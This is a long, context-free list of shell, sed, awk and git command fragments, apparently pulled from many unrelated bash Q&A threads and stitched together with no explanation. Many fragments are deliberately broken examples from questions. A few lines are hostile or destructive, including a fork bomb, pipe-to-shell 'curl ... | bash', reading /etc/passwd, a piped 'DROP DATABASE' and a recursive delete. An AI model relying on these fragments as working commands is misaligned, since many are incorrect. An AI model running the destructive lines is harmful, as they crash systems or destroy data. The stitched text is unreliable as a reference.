Project Target > Build Phases > Run Script > Shell
head -1
head -n 1
tail -n +2
[ ... ]
cat a.csv b.csv > X.csv
-d ,
paste command
man head
man tail
head -1
head -n 1
sudo -E
info coreutils mv
cp -a
curl ... | bash
length($2) > 0
{print $2}
gnu awk
$1 == $1
exit $?
ls l
ls l
| cat
ls l*
man bash
cut -f1 -d ";" file1.csv
watch commandname
watch sudo ps_pem.py
[[ -f $file ]] || break
[[ ... =~ ... ]]
find "/var/www/html/MyFolder/${dir##*/}" -name 'a_*.*' ...
find -name "filename"
find / -name "*.pdf"
echo chown root '{}' \;
man awk
( ... )
-type f
-type f
for x in "*.foo*; do
[[ ]]
shopt -s nullglob
rsync -av /folder/ /newfolder/
cp -dp
man touch
touch -h <someSymlink>; ls -l <someSymlink>
cp -a
-max_depth 1
chown -R root /yourdir
"$SCRIPTS/myscript.R" "$filecontent"
/usr/bin/Rscript: Argument list too long
" NR>1{printf \"=HYPERLINK(B%d, C%d) "
" https://otrs.city.pittsburgh.pa.us/index.pl?Action=AgentTicketZoom;TicketID=%s\n\", NR-1, NR-1, $0}"
-v var="$var"
fdisk -l /dev/sdc
dd if=/dev/sdc of=~/my_image.img bs=512 count=${blks}
1 1
sed: no input files.
sed -i -e 's|\r||' your_script.sh
string 1
string 2
string 3
find dir -name "filename" > find.out
dpkg -L package_name
xxx not overwritten
test -e $newname || mv $file $newname
/etc/init.d/network restart
man find
sed -i '1s/^/x y   z\n/' INPUTFILE.txt
sed -i '1s/^/x\ty\tz\n/' INPUTFILE.txt
brew install maven
No such file or directory
brew rm maven
mvn -v
-bash: /usr/local/bin/mvn: No such file or directory
. ~/.bash_profile
hash -r
mvn -version
sed 's/:/\t/g' cat BookDB.txt)
sed 's/:/\t/g' <<<$(cat BookDB.txt)
sed 's/:/\t/g' BookDB.txt
python -c 'import python_module; print python_method()'
!echo $PATH
!echo $SHELL
path/to/default/shell -c ...
!ps -p $$ && :
echo $SHELL
find ./images/ -iname "*.jpg" | sort -R | head -n <no. of files> | xargs -I {} cp {} target/
shuf -n
shuf -n 243
./program1 $parameter | nl -w1 > myfile
./program1 $parameter | nl -w1 -s" " > myfile
sed -i
#!/bin/env python
chmod +x yourscript.py
ls /usr/local/mysql-connector-c-6.1.5-osx10.7-x86_64/bin/mysql
usage message
shopt -s extglob
read -ra
su -m root -c 'grep ...'
declare -n
John, S.
profiles -P
sudo profiles -P
egrep -q ': com.meraki.sm.mdm$'
': com.meraki.sm.mdm$'
is the same as
mv "$a" "$a".backup
rails s
debug ENV
os.path.getsize(input_file) > 0
for (pat in patterns)
[ "$(egrep ... )" ]
egrep -s
sort -t'"' -k4n sort2.txt
info bash
*Note Printing a Prompt::
bash: line 5: [: 93107: unary operator expected
[ $result_from_stat -gt ]
[ 93107 -gt ]
\( -iname one_ext_pat -or -iname another_ext_pat \)
[[ ]]
[ ]
-u 4
stdin (0)
-ge MIN_SIZE
shopt -u -o histexpand
function grep { command grep --color=auto "$@"; }
"a b"
 
\t\n &();<>|
alias foo=bar=baz
command not found
echo merging
chmod 755 ./build.sh
./build.sh test-deploy
((  ))
[[ ]]
type [
[ is a built in shell command
test EXPRESSION
man test
info coreutils test invocation
0 == 1
info coreutils test invocation
grep -o "\.([^.\r\n]+\.)" inputfile > outputfile
grep -o "\.([^.]+\.)" inputfile > outputfile
$(printf %q "$variable")
declare -a
bash script.sh
from __future__ import division
for blob in $response
[colorcode here]
echo -e
textred=$(tput setaf 1)
echo -e
(^| )
( |$)
make install
$(echo "$data" | sed '$iq;d')
sed -n "${i}p"
$ vim filepath/that/contains
gunzip -f $dir/*gz*
sed 's|b"a|]&|g'
mysql -uroot -ppassword cacti
--optA, --optB, --optC, --optD
--optX and --optY
((OPTIND = $parse_index + 2))
HEAD detached at 19d7ea9
sed 's/HEAD\ detached\ at//
screen -d -m
for i in $(eval echo {$1..$2..2})
s/\([^ ]*\) \(discovers <PLANET>\).*/\1 \2/g
discovers <PLANET>
#completed successfully#
completed successfully
man iconv
ssh netpc screen -S minecraft -X stuff
$(printf '\r')
$(printf ‘\r’)
$($1 bench 4 2>&1|grep "Nodes\/second"|sed "s/.*: \([0-9]*\)/\1/")
ps-ef | grep node
git pull
tomorrow 00:00
sudo bash script argument
sudo script argument
exec.Command("/bin/sh", "-c", "sudo script", argument)
exec.Command("/bin/sh", "-c", "sudo script " + argument)
exec.Command("/bin/bash", "-c", "sudo script" + argument)
exec.Command("/bin/bash", "sudo script", argument)
exec.Command("/bin/bash sudo script" + argument)
Error:  exit status 1
Bundle 'jrestrepo/matlab'
man dyld
I'm good (& well[1];)
'I'\''m good (& well[1]);'
bash script.sh
sh script.sh
< 3.0
echo $BASH_VERSION
./myio.sh <your command>
./myio.sh dd if=/dev/zero of=/dev/null bs=1G count=4096
./myio.sh dd if=/dev/sda1 of=/dev/null bs=1M count=4096
pio.sh PID
while [ $a -lt $1 ]; do a='expr $a + 1' ...; done
(( ... ))
[ "$2" "1"]
if [[ -z $myrand ]]; then
a='expr $a + 1'
$(expr $a + 1)
(( ++a ))
[ ... ]
[[ ... ]]
do ...
then ...
if ...; then
for ...; do
(( ... ))
[[ ... ]]
[ ... ]
[[ ... ]]
(( ... ))
$(( ... ))
man bash
ARITHMETIC EVALUATION
find /usr/lib -maxdepth 1 -type l -iname "*libblas*"|xargs -I{} echo "{} =>" $(realpath {})
find -type f
-type f
grep -R STRING1 /path~
export PATH=/usr/local/bin:/usr/local/sbin:$PATH
apt-get purge node
tar -xvf filename
apt-get install node
apt-get install nodejs
which node
which nodejs
ln /usr/bin/nodejs /usr/sbin/node
echo $PATH |
echo "${PATH//:/$'\n'}" |
echo $PATH
bash script.sh
mindepth 1
find | head -n
ls | head -n
bash myfile.txt
at bash myfile.txt midnight
-f filename
rm -rf !(foo|bar)
$ git filter-branch --tree-filter 'rm -rf !(foo|bar)' --prune-empty HEAD
Rewrite 75c1ec1ef083338ca2e88db9cc6107c1630d91e9 (1/871)~/libexec/git-core/git-filter-branch: 1: eval: Syntax error: "(" unexpected
-O extglob
Both missing!
[[ ... ]]
[ ... ]
exec 4< /home/yusufh/Ruby/mypipe
read line <&4
mkfifo /path/to/pipe
echo test1
/path/to/script >> /path/to/pipe &
echo test2
read pipeddata < /path/to/pipe
IFS= read ...
sshj library
inetd (GNU inetutils) 1.7
tftp-hpa 5.2, with remap, with tcpwrappers
tr -d \\n
printf %s%s\\n
&& echo
$(grep ....)
`grep ....`
echo $x
-d '{"DATA":"'$x'" }'
grep "dad\|dead" text3.txt"
sh myscript.sh
Edit / EOL Conversion
sed -n '2,3p' bar > foo
sed -n '2,3p' bar >> foo
seq 1 10000000 | sed …
./myScript.sh a b c
set -x
"b c"
set -- hello world
"--foo=hello" "world"
"hello world"
-Dexec.args="hello world"
-Dexec.args="hello world"
[ ]
find -E * -type f -iregex ".*(${TYPE:1})" | while IFS= read -r file; do
[process pid]
xsltproc --stringparam SomeValue "$SomeVal" metadata.xsl metadata.xml
chmod +x awko
awko data
$2 != last_id
handleBlock() tests the OP's condition using
( max is
and min is m[cnt] ) to determine the output file name and then prints all elements from
sudo chsh -s /bin/bash username
curl <options> https://websitename.com?username=<username>&password=<password>
man bash
Pathname Expansion
bash derp.sh
for file in $*/*.gz
My Documents
for file in $(find ...)
find -print0
ls -a
printf $5"\n"$6"\n" > "DARN_INDUSTRY"
-q "^-"
echo -e "${CONFIG_FILE}x"
grep -q "^-"
grep -q "^-"
-f image2
shopt -s nocaseglob
shopt -u nocaseglob
hadoop classpath
setopt sh_word_split
setopt glob_subst
sort | uniq
sort -u
$(hadoop classpath)
setopt GLOB_SUBST
Sat Jun 14 06:36:42 CEST 2014
some_bash $?
if [ "$1" != "0" ]
./infosimul mu num
1 3 9
#PBS -q <queue_name>
qstat -q
#PBS -l walltime=02:30:00
-q <name of desired queue>
brew prune
brew uninstall node
brew prune
brew install node
worth to read
bash Anaconda.sh
sed "s/something/$variable/"
read -a
sed -n ...p
find /path1 -group group1
groups > array1 | for i in array1 do find /path1 -group array[i]
echo find /path1 "${ARGS[@]}"
find /path -ls | awk '{ print $0 >> "group_"$6".txt"; }'
cd /applications/MAMP/library/bin
./mysqldump -u root -p databaseName > /Applications/MAMP/htdocs/website/db.sql
date --help
man date
echo $*
-n N
echo -n
echo "https://www.evernote.com/shard/s2/nl/227468/1875e55a-e512-4cf9-9b18-9e93c6a27359/" | sed  's#https?:_/_/www_.evernote_.com_/shard_/(..)_/nl_/(......)_/(.+_/)#evernote:_/_/_/view_/$2_/$1_/$3$3#'
find . ! -name 'FILE0001' ! -name 'FILE0008' ! -name 'FILE0010' -exec rm {} /dev/null \;
binmode ARGV, ':utf8'
stash pop
git status
git status --porcelain
git status --porcelain
?? newfile.txt
git diff
git status --porcelain --untracked-files=no
wc -l
git status
git stash
git stash
git stash
git stash
git stash
git checkout
git stash
git stash pop
--apply --keep-index
git stash
git stash save
git stash
git stash
The http port is
./pebblegame.e $NUM points.dat > pebbled.dat
"xyz" | getline ...
sort | uniq
sort -u
eval 'FILE1=/path/file name'
/path/file name
echo ${myArray[(($k+1))]}
printf '%s\n'
"${myArray[@]:i + 1}"
diff "folder1" "folder2"
&> /dev/null
&> /dev/null
ssh-keygen -t rsa
ssh b@B mkdir -p .ssh
cat .ssh/id_rsa.pub | ssh b@B 'cat >> .ssh/authorized_keys'
ssh b@B
ssh -v b@B
mysql .... -p password
python file.py
> /dev/tty
ls -l
. file
foo [fileNamePrefix]
< inputfile.txt
sed -n '3,$p' inputfile.txt  | myprogram
input file.txt
man xargs
set complete=enhance
\en": history-search-forward'
openssl rand
<!-- Begin Description -->
<!-- End Description -->
grep -Po '".*?"'
tr  '\n' ' ' < file | grep -Po 'Nmap.*?(?=Nmap|$)'
vagrant ssh -c 'docker rm $(docker ps -a -q)'
>word 2>&1
git status 2&>1 > /dev/null
git status 2
1>name 2>name
1>name 2>name
git status 2&>1
git status 2 1>1 2>1
git status
git status 2
git status 2&>1 > /dev/null
git status 2&>1 > /dev/null
>file 2>&1
git status 2&>1 > /dev/null
git status 2
git status 2
git status
git status
man git status
man bash
> /dev/null
shell = True
ls -Sr
ls -a
My Documents
My Documents
sort -f
echo "C=$credits" ;
cp stardog-licence-key.bin $STARDOG_HOME
sudo stardog-admin server start
stardog-admin server start
sudo chown -R myUsername /data/stardog
stardog-admin server start
tar -zxvf file.tar.gz
"cmd" : ["echo", "-n", "some_text", ">", "~/some_file"]
">", "~/some_file"
even more information Date
GNU awk
if [ -f "$line" ];then
ls | while read line
for line in $(ls)
for line in *
FIRST SCENARIO
SECOND SCENARIO
chmod +x
chkconfig -add
bash -x script.sh
curl -v ....
ENOENT (No such file or directory)
cat << EOF
cat -A
cat -A
man sed
sed -i  "s#\(.*MYVARIABLE =\)\( .*\)#\1 "456"#" file
find ... -execdir grep ... \{} +
IFS=$'\n' MYVAR=( $(cmd ...) )
history -d number
ruby script.rb
ruby script.rb
history -c
"${SMITH_SCRIPT}" = "RELOAD"
( ... )
TEST_VAR="Contents Here"
Contents Here
printf %b $msg
printf %s\\n "$(printf %b "$msg")"
cat $FASTQFILES
cat $file
> ~/Programs/ncbi-blast-2.2.29+/DB_files/"${file%.fastq}.fasta"
Elapsed ...
export PROMPT_COMMAND=...
export PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME%%.*} $(eval "echo ${MYPSDIR}")\007"
git branch
$(git branch)
echo * master
foo bar <(qux)
foo "bar <(qux)"
bar <(qux)
bar /dev/fd/63
find /home/ -type d -name uploads -exec sh -c  'zip -r /backup/uploads/alluploads.zip `dirname $0`/`basename $0`' {} \;
find /home/ -type d -name uploads -exec sh -c  'string=`dirname $0` echo $string | sed `/\/home\/\(.*\)\/new\/wp-content\/uploads/`'{} \;
/bin/bash: '/home/nika/NetBeansProjects/Parallel Framework/process-executor.sh': No such file or directory
bin/bash '/home/nika/NetBeansProjects/Parallel Framework/process-executor.sh' workspace/ForDemo.java ForDemo.java ForDemo
grep -l
find ... ! -path ...
find ... -exec ... \{} \+
find ... ! -samefile ...
man find
rm output; gcc program.c -o output; ./output
grep -o
sleep prevented
bash Scripting
bash Scripting
relative path/soure file name=source file name
var = ["test1", "test2"]
awk '{for(i=1;i<=NF;i++){if($i~/^customfield_12345/){print $i}}}' abc.log
echo ${MYVAR##*/}
scp local_file user@servername:./remote_file
ssh user@servername cat -n remote_file
xterm -e "bash -c \"ssh user@servername; exec bash\"" &
ssh user@servername
printf -v
cp -r new/* .
$BASH_SOURCE == $0
[[ true ]]
[[ false ]]
[[ -n true ]]
[[ -n false ]]
trap '' 2
trap cmd 2
trap "command" SIGINT
exit 1
This shouldn't happen
p4 client test_project
grep -Fxq search-string text-file
awk '/^search-string$/ {do something}'
grep -Fxq
-n -e
ruby -e "print 'Enter: '; input = \$stdin.gets; puts 'Entered: ' + input"
ACCT=stat -c '%U' ${DIRARR[$i]}; #NOT WORKING HERE
stat -c
read -a
grep -o
<subElement name="removeme"/>
<subElement name="removeme"/>
gnu awk
/<\/element>/{g;/<subElement name="removeme"\/>/!p}
cd /tmp
export PS1=...
for d in ...
echo hi
xargs -n 1
while read
General Letters
cut -d/ <whatever>
set +m
set -m
set +m
shopt -u -o monitor
process substitution
exec 3>&1
pid=$( sleep 200s >&3 & echo $! )
[1] 21763
[1]+  Done sleep 5
whois $line
iptables -I OUTPUT -m owner --uid-owner appuser -j ACCEPT
iptables -vL OUTPUT |sed -n '2p;/appuser/p'
until foo
while ! foo
ssh root@$IP sed -i -e 's/listen\t80\default_server;/test/' /etc/nginx/conf.d/default.conf
/bin/bash script_name.sh
bash path/to/script_name.sh
./myscript.sh http://example.com/example2.tar.gz
kill <pid>
kill -9 <pid>
trap -- '' SIGINT SIGTERM SIGTSTP
set -e
awk $(...)
awk BEGIN { print "hello!" }
awk 'BEGIN { print "hello!" }'
{"code":-4,"message":"Insufficient funds"}
du -h
system boot
man bash
unterminated substitute pattern
sed 's,\t,^= ,'
sed 's,'$'\t'',^= ,'
testing a \"string right here\"
testing a "string right here"
echo -e
TESTB=$(eval echo "$TESTA") ; echo $TESTB
testing a "string right here"
string.split(' | ')
### To Read:
### Read:
$response = curl_exec($ch);
cp file /tmp XX
-f 4
-d " "
" "
${sqlite_html_output} <!-- this is a placeholder I want to use -->
[[ ]]
[ ]
(( ))
date --version
date (GNU coreutils) 8.21 ...
du -s
1025 1026
echo $var | sed | grep | awk | and so on... and so on...
/bin/sh ./login.sh
[: 4: mycroft: unexpected operator
(( ... )
bash -c 'funcName arg ...'
-v q=\'
"bash -c \047retrieve \"" argToPass "\"\047"
| getline
ps aux
source view
.mode html
printf -v uri "$uri_template" "$PROTO" "$USER" "$PASS" "$HOST" "$TARGET"
curl URL 2>&1 | grep -oE 'href="([^"#]+)"' | sed "s/ /%20/g" | cut -f2 -d "="
help test
(( ))
[[ ]]
[ ]
!a[$1]++ { keys[++i] = $1 }
!r[FILENAME]++ { ++argind }
{ b[$1, argind] = $2 }
END { for (i = 1; i in keys; ++i) { k = keys[i]; t = k; for (j = 1; j <= argind; ++j) t = t FS (length(b[k, j]) ? b[k, j] : "0000"); print t } }'
. file.sh
system("/bin/bash -c '. PathOfFile/file.sh'");
system("/bin/bash -c '. PathOfFile/file.sh'");
until [ 1 -lt 1 ]
1 < 1
until [ 1 -lt 1 ]
% node example.js
-bash: fg: %: no such job
node example.js
node example.js
Server running at http://127.0.0.1:1337/
ssh rpatil@192.168.1.5 grep -E "GapEvent|GapFilled" "$logFile" > $server-$testName.log
"no command GapFilled"
No such file or directory
No such file or directory
trap "instructions" SIGNAL[S]
set | head
remove . at the end of each column
FS=" "
< <(lsusb)
lsusb -D
$(lsusb -D /dev/bus/usb/001/002)
Cannot open /dev/bus/usb/001/002
Found Hidden port that not appears in ss: 1025
"No hidden ports found."
1025 1026
No hidden ports found.
awk -v name=val
[^ \t\r]
printf "%s," "$file"
bash script
mysqlshow |grep -n openworl
./run 1 > 1_out
./run 10 > 10_out
sudo pip install j2cli
IFS= read -d '' -r escapedValue < <(quoteSubst "$value")
grep -l
sh myscript.sh
bash myscript.sh
(( cols[i] == val ))
[[ ${cols[$i]} == "$val" ]]
bash myscript.sh
svn export svn://0.0.0.1/models/tags/201407221642/ResponseA.xsl
svn export -q svn://0.0.0.1/models/tags/"$tag"/deploy-filelist.yml
scp your_username@remotehost.com:foobar.txt /some/local/directory
./script.sh password yes
grep -A 1 XX file | grep -v XX | grep YY
null terminated
null terminated
if grep -q 'pattern' testfile
if egrep -qw 'string1|string2' testfile
if perl -ne '(hundreds of lines of code here)' testfile
then :; else ...
if ! ...
file_exists=[ -f $myfile ]
test -f $file
[ -f $file ]
mytest=[ -f $file ]
-f $file ]
mytest= [ -f $file ]
[ -f $file ]
mytest= /bin/false
set -x
set -v
set -e
set -e
sh yourscript
[ ]
[[ ]]
[ ]
man test
[ ... ]
(( $INPUT >= 1 && $INPUT <= 10 ))
npm install
cd $2
sed '/DNW/d' sample.txt >> output.txt
compgen -u
strace -o compgen.out bash -c 'compgen -u'
open("/etc/passwd", O_RDONLY)
getent passwd
cat /etc/passwd
bash: ./install_programs: /bin/bash^M: bad interpreter: No such file or directory
apt-get ..
"if [ \"$(id -u)\" != \"0\" ]; then echo \"You need root permission for installing programs.\" 1>&2; exit 1; fi"
if [ "$(id -u)" != "0" ]; then echo "You need root permission for installing programs." 1>&2; exit 1; fi
"""if [ "$(id -u)" != "0" ]; then echo "You need root permission for installing programs." 1>&2; exit 1; fi"""
man rsync
-d ''
help read
tee ~/.last_command.txt
bash | tee -a ~USERNAME/.bash_output
:source {filespec}
This is a prompt:
-p PROMPT
Hello, world!
remote: hooks/post-receive: 1: hooks/post-receive: #!/bin/bash: not found
remote: hooks/post-receive: 1: hooks/post-receive: : not found
tail -n +4
head -n -1
tr -d '| '
for i in $(ls *.mp3)
update sql
-t YYYYMMDDHHMMSS
date +%s
date +%s
cmd="date +%s"; cmd|getline now; close(cmd)
gnome-terminal -x sleep 10
gnome-terminal --help-all
gnome-terminal --help-all
Isn't it nice to have a computer that will talk to you?
not get the value
export word1=$word1
man bash
declare -g
man bash
emacsclient -a
man last
last -f /var/log/btmp | gawk -v user=bob -v date=20140723145100 ...
update-rc.d myscript defaults
xattr -l
echo ${a:0:-4}:${a#${a:0:-4}}
grep -F
-B 1
-A 2
line 1: #!/bin/bash: No such file or directory
[[ ]]
[ ]
IFS=$' \t\r\n'
IFS=', '
find ... | xargs ... command
ps -o comm= -p $PPID == "sshd"
ps -o comm= -p $PID -p $$ >> moshbash
tmux attach
print phrase.lower
print phrase.lower()
raw_input('please provide foo')
$DATE >= $SINCE
sed -f replace.sed InputFile
-f file
cmd /c
-v "$1"
-z "$1"
-n "$1"
indirect variable expansion
set -x
echo $foo
echo *.txt
<<< "${foo[*]}"
IFS=, cat <<< "${foo[*]}"
"111 222 333"
111 222 333
IFS=, read bar <<< "${foo[*]}"; echo "$bar"
oil r cron:sync $id
it should not wait for a sync
set -o noclobber
x | y
shopt lastpipe
IFS= read -d '' -n 1
help read
exec >"$1"
printf '\x00'
exec cat
help exec
printf "\033]0;%s@%s:%s\007%s"...
echo -n "$line" | hexdump -C
Bus 003 Device 046: ID fc08:0101
$ cat /dev/bus/usb/003/046
/dev/input/by-id/[Your piano]
[ "$var" == "pass" ]
pow [base] [exponent]
{ .. }
$(( ))
second column
sort -nr -k 2
join file2 file1 | sort -nr -k 3
-t' '
column -t
column -t
ls -1
sort -t_
sort -z
xargs -0
sort -z
xargs -0
xargs -I
mkdir -p
rpm -qi
python -c
Argument expected for the -c option
"print 'aa'
python -c "print 'aa'; print bb'"
aws ec2 describe-instances | jq
IFS=$' \t\n'
mysql insert
echo "$ip"
p4 sync -f
sudo p4 sync -f
git filter-branch
git config --global color.ui false
git log
git rev-list
git log --pretty=oneline
--reverse -n 1
git rev-list
IFS=" ",
"key4": "value4"
sudo apt-get install jq
brew install jq
"key4": "value4"
e2 80 a2
<( ... )
declare -n
declare -l
print $0
chmod +x ./Makefile
man make
-atime +n
-ctime +n
-mtime +n
n*24 hours ago
greater than n*24 hours ago
less than n*24 hours ago
greater than 6 days old
"date -d \""$6" " $7" " $8 "\" +%s" |getline; fdate=$1
fdate < cutoff {print line}
sh script.sh
bash script.sh
CTRL-A Q
git commit
-w a<Tab><Tab>
alias gc='git commit -v'
git commit -v
hash -d
cd ~w/a-repo
setopt AUTO_CD
id -u
[: -gt: unary operator expected
[[ ... ]]
[ ... ]
[ ... ]
test ...
set -xv
set +xv
set -xv
[[ ... ]]
[ ... ]
[[ ... ]]
[ ... ]
30 min
30 min
man find
grep | sort | tail
BAR BAR
"BAR BAR"
cd *
echo *
echo $STRING1
echo $STRING2
grep -P
grep -oP
grep -P
[[ -n $varDef ]]
while ... <(sed ...)
sed ... | while ...
for domain in $domains
for domain in $domains ''
grep $YESTERDAY $ACCESSLOG | grep "$1" | awk -F" - " '{print $1}' | sort | uniq -c | awk '{sum += 1; print } END { print "     ", sum, "total"}'
awk -v unique_sum=0 ...
wc -l
ls > filenames.txt
ls | sort ...
rvm get stable --auto-dotfiles
rvm get head --auto-dotfiles
rvm use 2.1.1
source ~/.profile
rm *x
ps processID
ps -o pmem h -p processID
ifconfig -s
CMD4="echo 'DROP DATABASE db_test;' | mysql"
curl -fs -- "$URL" | grep -q -- "$WORD1" && $CMD4
echo 'DROP DATABASE db_test;' | mysql
mysql -Bse 'expression'
mysql -h somehost -u someuser -p pass -Bse "expression"
if [ $i -lt 1 ]
if (( $i > 1 )); then
envsubst "$(env | sed -e 's/=.*//' -e 's/^/\$/g')"
sh run.sh
bash run.sh
man du
cat /tmp/TESTRET
[ ]
$(cat /tmp/TESTRET)
:(){ :|:& };:
-D, --dump-header <file>
foo $bar
shopt -s -o noglob
set -f
for x in $something; do
IFS=<separators> read -rd '' -a array <<< "$something"; for x in "${array[@]}"; do
do_something $x
t loop
PATH=/Users/username/Applications/Android Studio/sdk/platform-    tools:/Users/username/Applications/Android Studio/sdk/tools:/usr/local/git/bin:/sw/bin/:/usr/local/bin:/usr/local/:/usr/local/sbin:/usr/local/mysql/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/bin/
! -z
(( ))
(( ))
error: near " "
ssh-add -l
bash -c export
man bash
vi log.sh
chmod +x log.sh
sh -vx log.sh
man utmp
man find
[ ... ]
[[ ... ]]
su -c script
sudo script
sudo scriptname
su -c scriptname
chmod 0775 scriptname
chmod 0774
Permission denied
command not found
sudo bash scriptname
su -c "bash scriptname"
declare -p
() {
while [ "$ret" != "0" ]; do curl [your options]; ret=$?; sleep 5; done
bash /path/to/script.sh
tac | sed | tac
tac awk
tr '\0x20'
shopt -s extglob
mv /one/two/three/four/ /one/two/five/six
mv /one/two/three/four /one/two/five/six
man page
man 1 mv
mv /ten /one/two/three/four/five
mv /ten /one/two/three/four/five/six
forever list
Sqoop 2
for __date in "$dates"
for __date in "${dates[@]}"
-n 1
sed '52q;d' Files*
.sh bash script
.sh script
man bash
Tilde Expansion
Edit environment variables for your account
Environment Variables
bash: grunt: command not found
vagrant ssh -c 'bash /vagrant/vagrant_build.sh'
vagrant ssh -c COMMAND
sed -i '2,${/pattern/d}' filename
maxretry = 6
maxretry = 5
column -t
column -t
$(ls $HOME)
ls $HOME
my file
[ -f "$name" -a -r "$name" ]
[[ ]]
[ ]
while read
while IFS= read -r file; do ...; done < <(exec ls -1 "$HOOME")
which killall
ls fil
ls file12
ls file
ls: cannot access bash: No such file or directory
ls file*
$value == 1
echo "${use_color[red]}"
set +o errexit
set +o pipefail
vim Good<TAB>
vim FooGood
vim Bad<TAB>
vim FooBad
$ vcgencmd measure_temp
$ free -o -h
Inputfile Example:
Desired Output:
fpath=(~/.zsh-completions $fpath)
autoload -U compinit & compinit
#compdef scriptname
#compdef scriptname
ssh -t
bash -l
csh -l -c
readlink *
-type l
[[ -h $fn ]]
line 2
"This is, a value."
grep -w
read -e -p "> All good ? (y/n)" -n 1 confirm;
echo -e
man echo
echo -e
read -ep
echo "$line" | grep "b"
grep b
while read ... done < file
is not a directory
hash=$(openssl ... "$x"); ln -s "$x" "${hash}.0"
ln -s "$x" "$(openssl ... "$x")"
foo | bar
-m ...
echo -n
kill -9
. foo
source foo
set -H
set -o history
set -H
set -o histexpand
sed '/foo/!d' file
set +H
shopt -u -o histexpand
grep -c ''
wc -l | cut
grep -l -f words story*
fgrep -c
heroku config:get SENDGRID_USERNAME
heroku config:get SENDGRID_PASSWORD
heroku config:get SENDGRID_USERNAME
$( ... )
man bash
C-c C-c
man bash
man curl
-D -
-D /dev/stdout
sed '/\[ssh\]/,/\[dropbear\]/ !s/maxretry = 6/maxretry = 5/'
printf "%07.2f" <input>
printf "%07.2f" .99
ls | xargs -I '{}' sh -c 'echo "{}" $(stat -c "%y %s" "{}")'
sh -c
sh -c
sh -c
ls | xargs -I '{}' eval 'echo "{}" $(stat -c "%y %s' "{}")'
sh -c
sh -c
bash -c
sh -c
sh -c
sh -c
<p key=SaveFile>0</p>
<p key=SaveFile>1</p>
gsub("\\(", "", $1); gsub("\\)", "", $1);
i am apoole
{printf "%s", $1"\t"$2"\t"$9"\t"$10"\t"$11"\t"}
Syntax error: "(" unexpected
git branch --merged
FileA-suffixA FileB-SuffixB FileC-SuffixC FileD-SuffixA
-type f
-iname '*.SUFFIX'
grb foo
grep -Irs --include '*.*rb' foo .
grb foo
grep $x "$y" "${@-.}"
$ man bash
source .bash_profile
source ~/.profile
chsh -s /bin/bash
echo $SHELL
~ % sudo chmod 700 ~/.bash_profile
permission denied
~ % ls -a -l
~ % sudo chown <user_name> ~/.bash_profile
sh run.sh
od -cx
echo $NUM | tail -c 2
SplitsTree +g
/bin/bash -l -c some_command
export SMTP_PORT=abc
Bluetooth low energy
device is busy
\( ...\)
i \...
a \...
may be ok
no clue - 10
master.zip 'TS3UpdateScript-master/*' -x 'TS3UpdateScript-master/configs/'
sh push.sh
sh push.sh --table=17
$(< file)
sed -i "s/WhatToFind/WhatToPut/g" ".\MyDir\*"
sed -i.BackUp "s/WhatToFind/WhatToPut/g" ".\MyDir\*"
impossible to read
-i ''
set -x
set +x
sh: /touch: not found
sh: /cp: not found
ssh root@myserver.com
cd /path_to_my_cakephp_folder/app/
Console/cake update
| awk '{print $5,$6,$7,$8}' | xargs -L 1 command
grep "8 2"
| awk '/8 2/ {print $5,$6,$7,$8}' | xargs -L 1 command
man logger
--file file
awk '{print $2}' filename.txt
chmod 444
rm -f
workon $SOME_VIRTUALENV
kill -9
echo 'Test-01-02-03' | awk -F- '{print $1}'
echo '01-02-03-Test-Ref1-Ref2' | awk -F- '{print $NF-2}'
str="Test-01-02-03"; split(str, a, /-/); print a[1]
str="01-02-03-Test-Ref1-Ref2"; numfields=split(str, a, /-/); print a[numfields-2]
trap 'backtrace "${#BASH_SOURCE[@]}" "${BASH_SOURCE[@]}" "${#BASH_LINENO[@]}" "${BASH_LINENO[@]}"' ERR
gpg -d
cat <fifo
man bash
syntax error near unexpected token 'fi'
rm -f
rm -f
rm -f
rm -f
!#:*  !#:1
"This is a sentence."
"This is a sentence"
This is a sentence.
if [ $x=5 ]; then
if [ $x = 5 ]; then
$x = 5
= 5
"$x" = 5
05 = 5
05 -eq 5
IFS=' '
echo /home/user/current/dir
echo $(pwd)
git status
git symbolic-ref -q --short HEAD
git branch
docker ps
docker inspect
command: ["python3", "startup.py"]
mysqladmin ping
mysqladmin ping
mysqladmin ping -h 127.0.0.1 -u root --password=MY_ROOT_PASS --wait=30 -v
docker-compose run server sh ./db-ready.sh && docker-compose run server yarn run migrate
/usr/bin/mysql --user=root --password=root --execute "SHOW DATABASE;"
mysqladmin ping
metaflac ... | bash
eval $(metaflac --show-tag ARTIST myfile.flac) the variable
is set to
eval $(metaflac --show-tag ARTIST myfile.flac)
help complete
sed -n '/<property name="abc"/s/.*value="\(.*\)"[^\n]*/\1/p' file
sed '/<property name="abc"/s/.*value="\(.*\)"[^\n]*/\1/' file
exec($command, &$output)
ls *.aria2
./script2 &
ps aux
shopt -s extglob
zenity --info
MD5::Digest 
The passwords generated by this application are very strong, here is an example of the strength you can achieve by using this application;
if [ $? == 500 ]; then
[ ... ]
sed 's|^\([^ ]*\) \([^,]*,\)\{7\}\([^,]*\),.*|\1 \3|' Record1.txt
awko data
uniq -c
vimdiff t1 t2 | :TOhtml
"id" (any number of spaces):(any number of spaces)"
. myscript &
./myscript &
. source
subprocess.CalledProcessError as e
echo whoami
echo $USER
knife download
knife upload
while ! { test "$option" = 1 || test "$option" = 2; }; do ...
shell globbing
'history *[0-9]*'
bash shell_test.sh
# in sorted order
ssh -t
Warning: no access to tty (Bad file descriptor). Thus no job control in this shell.
aws s3 ls
bash myScript
grep -r 'term' *
some_command <<< "$variable"
a && b || c
help test
read -u 5 a;echo $a
sh kill_proc.sh node
kill -9 node
kill -9
kill "$PROCESS"
stash save --keep-index
stash pop
-d u1
[ -n "$outputFile" ]
! 2>/dev/null : >> $outputFile
! : >>
read -p
${VarName%% *}
bash script.sh
ps -ft tty0
bash script.sh
ps -fax
exec sh script.sh
. ./script.sh
$(echo $url)
wc -l
NF > 1
awk -v IT=$(cat file1|wc -l) -F ';' '/DHCP/ {for(i=1; i<=IT; i++) {getline; print $2$1}}' file \| awk '{print $1"=>\"0000:0000:0000:1000::"$2"/64\""}'
echo $PATH
19.53 GB
1.50 GB
/dev/vda             Device     19.53 GB
sudo gcc -lpthread server.c -o wifiserver.o
sudo ./wifiserver.o
chmod +x
sudo update-rc.d auto_server_start defaults
ps -e
sudo kill
sudo kill
how many times
from when
\( \)
cat mylog.log | grep Amount | awk -F 'Amount: ' '{sum+=$2}END{print sum}'
/^Amount/ {}
END {print amount+0}
sh -c
x, x.x
